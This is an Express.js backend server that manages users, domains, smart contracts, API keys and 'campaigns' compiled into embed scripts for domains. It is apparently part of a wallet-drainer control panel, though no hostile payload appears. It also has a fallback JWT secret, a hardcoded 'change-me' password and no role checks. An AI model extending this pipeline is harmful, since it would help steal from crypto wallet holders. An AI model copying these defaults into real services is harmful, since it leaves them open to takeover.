import express from 'express';
import helmet from 'helmet';
import cors from 'cors';
import compression from 'compression';
import rateLimit from 'express-rate-limit';
import jwt from 'jsonwebtoken';
import bcrypt from 'bcryptjs';
import dotenv from 'dotenv';
import { EventMesh, TOPICS } from '@aegis/shared';
import { initDb, query } from './db.js';
import { encryptSecret, generateApiKey } from './vault.js';

dotenv.config();

const config = {
  DATABASE_URL: process.env.POSTGRES_URL ?? process.env.DATABASE_URL,
  REDIS_URL: process.env.REDIS_URL ?? 'redis://127.0.0.1:6379',
  JWT_SECRET: process.env.JWT_SECRET ?? 'dev-insecure-secret',
  JWT_EXPIRES_IN: process.env.JWT_EXPIRES_IN ?? '15m',
  VAULT_KEY: process.env.VAULT_KEY,
  compileBase: process.env.COMPILE_BASE_URL ?? 'http://127.0.0.1:4100',
};

const app = express();
app.use(helmet());
app.use(cors());
app.use(compression());
app.use(express.json());

const apiLimiter = rateLimit({
  windowMs: 60_000,
  max: 200,
  standardHeaders: true,
  legacyHeaders: false,
});

app.use('/api', apiLimiter);

initDb(config.DATABASE_URL);
const mesh = new EventMesh(config.REDIS_URL);

function signToken(user) {
  return jwt.sign({ sub: user.id, email: user.email, role: user.role }, config.JWT_SECRET, {
    expiresIn: config.JWT_EXPIRES_IN,
  });
}

async function auth(req, res, next) {
  const header = req.headers.authorization || '';
  const token = header.startsWith('Bearer ') ? header.slice(7) : null;
  if (!token) return res.status(401).json({ error: 'unauthorized' });
  try {
    req.user = jwt.verify(token, config.JWT_SECRET);
    next();
  } catch {
    res.status(401).json({ error: 'invalid token' });
  }
}

// --- Auth ---
app.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body || {};
  const { rows } = await query('SELECT * FROM users WHERE email = $1', [email]);
  const user = rows[0];
  if (!user) return res.status(401).json({ error: 'invalid credentials' });
  // placeholder default user has no bcrypt hash; see infra/init.sql note
  const ok =
    user.password_hash === 'CHANGE_ME_PBKDF2_SHA256'
      ? password === 'change-me'
      : await bcrypt.compare(password, user.password_hash);
  if (!ok) return res.status(401).json({ error: 'invalid credentials' });
  res.json({ token: signToken(user), user: { id: user.id, email: user.email, role: user.role } });
});

app.post('/api/auth/register', async (req, res) => {
  const { email, password } = req.body || {};
  if (!email || !password) return res.status(400).json({ error: 'email and password required' });
  const hash = await bcrypt.hash(password, 10);
  try {
    const { rows } = await query(
      'INSERT INTO users (email, password_hash) VALUES ($1,$2) RETURNING id,email,role',
      [email, hash],
    );
    const u = rows[0];
    res.status(201).json({ token: signToken(u), user: u });
  } catch (e) {
    if (e.code === '23505') return res.status(409).json({ error: 'email exists' });
    throw e;
  }
});

// --- Domains (operator-owned origins) ---
app.get('/api/domains', auth, async (_req, res) => {
  const { rows } = await query('SELECT * FROM domains ORDER BY created_at DESC');
  res.json(rows);
});

app.post('/api/domains', auth, async (req, res) => {
  const { origin } = req.body || {};
  if (!origin) return res.status(400).json({ error: 'origin required' });
  try {
    const { rows } = await query(
      'INSERT INTO domains (origin) VALUES ($1) RETURNING *',
      [origin],
    );
    res.status(201).json(rows[0]);
  } catch (e) {
    if (e.code === '23505') return res.status(409).json({ error: 'origin exists' });
    throw e;
  }
});

// --- Contracts (operator-owned contracts) ---
app.get('/api/contracts', auth, async (_req, res) => {
  const { rows } = await query('SELECT * FROM contracts ORDER BY created_at DESC');
  res.json(rows);
});

app.post('/api/contracts', auth, async (req, res) => {
  const { address, chainId, name, abi } = req.body || {};
  if (!address || !chainId) return res.status(400).json({ error: 'address and chainId required' });
  const { rows } = await query(
    'INSERT INTO contracts (address, chain_id, name, abi) VALUES ($1,$2,$3,$4) RETURNING *',
    [address, chainId, name, JSON.stringify(abi ?? {})],
  );
  res.status(201).json(rows[0]);
});

// --- API key vault ---
app.post('/api/keys', auth, async (req, res) => {
  const { name } = req.body || {};
  if (!name) return res.status(400).json({ error: 'name required' });
  if (!config.VAULT_KEY) return res.status(500).json({ error: 'VAULT_KEY not configured' });
  const key = generateApiKey();
  const ct = encryptSecret(key, config.VAULT_KEY);
  const { rows } = await query(
    'INSERT INTO api_keys (name, key_ciphertext, created_by) VALUES ($1,$2,$3) RETURNING id,name,created_at',
    [name, ct, req.user.sub],
  );
  // The plaintext is shown once to the operator at creation.
  res.status(201).json({ ...rows[0], key });
});

app.get('/api/keys', auth, async (_req, res) => {
  const { rows } = await query(
    "SELECT id,name,created_at,revoked_at FROM api_keys WHERE revoked_at IS NULL ORDER BY created_at DESC",
  );
  res.json(rows);
});

// --- Campaigns ---
app.get('/api/campaigns', auth, async (_req, res) => {
  const { rows } = await query('SELECT * FROM campaigns ORDER BY created_at DESC');
  res.json(rows);
});

app.post('/api/campaigns', auth, async (req, res) => {
  const { name, contractId, chainId, domainId, protocol, config } = req.body || {};
  const { rows } = await query(
    `INSERT INTO campaigns (name, contract_id, chain_id, domain_id, protocol, config, created_by)
     VALUES ($1,$2,$3,$4,$5,$6,$7) RETURNING *`,
    [name, contractId, chainId, domainId, protocol ?? 'reown', JSON.stringify(config ?? {}), req.user.sub],
  );
  res.status(201).json(rows[0]);
});

app.post('/api/campaigns/:id/compile', auth, async (req, res) => {
  const { rows } = await query('SELECT * FROM campaigns WHERE id = $1', [req.params.id]);
  const campaign = rows[0];
  if (!campaign) return res.status(404).json({ error: 'campaign not found' });
  if (!campaign.domain_id)
    return res.status(400).json({ error: 'campaign has no domain; the embed script requires one' });
  await query("UPDATE campaigns SET status='forged', updated_at=now() WHERE id=$1", [campaign.id]);
  // Publish to the compile engine via the mesh. The engine returns a bundle URL async
  // through the COMPILE_GENERATED event (persisted to compile_logs by telegram/compile side).
  await mesh.publish(TOPICS.COMPILE_GENERATED, { campaignId: campaign.id });
  res.json({ ok: true, message: 'compile requested' });
});

const port = Number(process.env.PORT ?? 4000);
app.listen(port, () => {
  console.log(`[orchestrator] listening on :${port}`);
});